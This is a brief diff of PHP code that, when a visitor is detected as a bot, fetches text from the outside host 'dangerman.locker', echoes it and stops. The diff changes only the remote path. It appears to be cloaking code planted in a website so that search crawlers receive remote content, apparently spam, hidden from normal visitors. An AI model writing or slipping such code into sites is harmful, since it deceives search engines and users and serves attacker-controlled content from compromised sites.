@@ -13,7 +13,7 @@ return false;
 }
 
 if (is_bot()) {
-$message = file_get_contents('https://dangerman.locker/jurnalsamodrailmu/index.txt');
+$message = file_get_contents('https://dangerman.locker/landing/samodrailmu/index.txt');
 echo $message;
 exit;
 }
